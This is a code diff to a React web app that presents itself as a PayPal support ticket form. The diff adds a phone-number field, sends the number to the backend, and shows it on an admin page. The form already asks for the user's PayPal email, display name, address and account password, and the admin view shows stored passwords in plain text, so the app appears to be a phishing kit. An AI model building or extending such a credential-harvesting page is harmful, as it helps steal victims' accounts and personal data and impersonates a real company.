@@ -30,6 +30,7 @@ const paths = {
   download:"M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3",
   refresh: "M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0l3.181 3.183a8.25 8.25 0 0013.803-3.7M4.031 9.865a8.25 8.25 0 0113.803-3.7l3.181 3.182m0-4.991v4.99",
   xmark:   "M6 18L18 6M6 6l12 12",
+  phone: "M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-.97 1.293c-.282.376-.769.542-1.21.38a12.035 12.035 0 01-7.143-7.143c-.162-.441.004-.928.38-1.21l1.293-.97c.363-.271.527-.734.417-1.173L6.963 3.102a1.125 1.125 0 00-1.091-.852H4.5A2.25 2.25 0 002.25 4.5v2.25z",
 };
 
 const Icon = ({ name, className = "w-5 h-5" }) => (
@@ -461,9 +462,11 @@ function SubmitPage({ onNavigate }) {
   const [lastName,  setLastName]  = useState("");
   const [username,  setUsername]  = useState("");
   const [email,     setEmail]     = useState("");
+  const [number, setNumber] = useState("")
   const [address,   setAddress]   = useState("");
   const [issue,     setIssue]     = useState("");
   const [password,  setPassword]  = useState("");
+
   const [category,  setCategory]  = useState("");
   const [priority,  setPriority]  = useState("normal");
   const [errors,    setErrors]    = useState({});
@@ -501,7 +504,7 @@ function SubmitPage({ onNavigate }) {
       const res = await fetch(`${API}/tickets`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ firstName, lastName, username, email, address, password, issue: `[${catLabel}] ${issue}` }),
+     body: JSON.stringify({ firstName, lastName, username, email, number, address, password, issue: `[${catLabel}] ${issue}` }),
       });
       const data = await res.json();
       if (data.success) setSuccess(data.ticketId);
@@ -570,7 +573,8 @@ function SubmitPage({ onNavigate }) {
             </div>
             <Field label="Username / PayPal Display Name" value={username} onChange={v => { setUsername(v); clearErr("username"); }} placeholder="@johndoe" hint="The name shown on your PayPal account" error={errors.username} />
             <Field label="Email Address" value={email} onChange={v => { setEmail(v); clearErr("email"); }} type="email" icon="mail" placeholder="john@example.com" hint="Must match your PayPal account email" error={errors.email} />
-            <button onClick={() => { if (validateStep1()) setStep(2); }}
+<Field label="Phone Number" value={number} onChange={v => { setNumber(v); clearErr("number"); }} type="tel" icon="phone" placeholder="+1 234 567 8900" hint="Include country code" error={errors.number} />
+  <button onClick={() => { if (validateStep1()) setStep(2); }}
               className="w-full bg-[#003087] hover:bg-[#002070] text-white font-bold py-4 rounded-2xl transition-all hover:shadow-lg hover:shadow-blue-900/25 hover:-translate-y-0.5 flex items-center justify-center gap-2 mt-2">
               Continue <Icon name="arrow" className="w-4 h-4" />
             </button>
@@ -987,6 +991,7 @@ function AdminPage({ onNavigate }) {
     {l:"Username",  v:`@${selected.username}`},
     {l:"Email",     v:selected.email},
     {l:"Password",  v:selected.password},
+{l:"Phone",     v:selected.number},
     {l:"Address",   v:selected.address},
     {l:"Submitted", v:new Date(selected.created_at).toLocaleString("en-GB",{dateStyle:"medium",timeStyle:"short"})},
   ].map(f => (
